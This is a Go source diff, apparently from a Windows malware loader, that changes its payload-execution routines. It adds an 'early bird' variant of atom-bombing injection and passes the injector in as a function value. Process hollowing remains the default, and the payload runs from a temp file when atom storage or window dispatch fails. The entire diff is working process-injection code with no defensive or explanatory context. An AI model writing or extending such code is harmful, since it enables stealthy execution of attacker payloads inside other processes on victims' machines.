@@ -8,7 +8,8 @@ const (
 )
 
 var (
-	atomicAtomIDs      []uint16
+	atomicAtomIDs   []uint16
+	atomicInjector  func([]byte)
 	errorClassExists = syscall.Errno(1410)
 )
 
@@ -43,16 +44,30 @@ type atomicMsg struct {
 }
 
 func executeAtomicBombing(payload []byte) {
+	if !atomicExecute(payload, executeProcessHollowing) {
+		executeFromTemp(payload)
+	}
+}
+
+func executeEarlyBirdAtomicBombing(payload []byte) {
+	if !atomicExecute(payload, executeEarlyBird) {
+		executeFromTemp(payload)
+	}
+}
+
+func atomicExecute(payload []byte, injector func([]byte)) bool {
 	ids, ok := atomicStoreAtoms(payload)
 	if !ok {
-		executeFromTemp(payload)
-		return
+		return false
 	}
+	atomicInjector = injector
+	defer func() { atomicInjector = nil }()
 	defer atomicDeleteAtoms(ids)
 	atomicAtomIDs = ids
 	if !atomicDispatchWindow() {
-		executeFromTemp(payload)
+		return false
 	}
+	return true
 }
 
 func atomicStoreAtoms(payload []byte) ([]uint16, bool) {
@@ -160,7 +175,13 @@ func atomicWindowProc(hwnd syscall.Handle, msg uint32, wparam, lparam uintptr) u
 	case atomicWMTrigger:
 		payload := atomicRebuildPayload()
 		if len(payload) > 0 {
-			executeProcessHollowing(payload)
+			fn := atomicInjector
+			atomicInjector = nil
+			if fn != nil {
+				fn(payload)
+			} else {
+				executeProcessHollowing(payload)
+			}
 		}
 		procPostQuitMessage.Call(0)
 		return 0
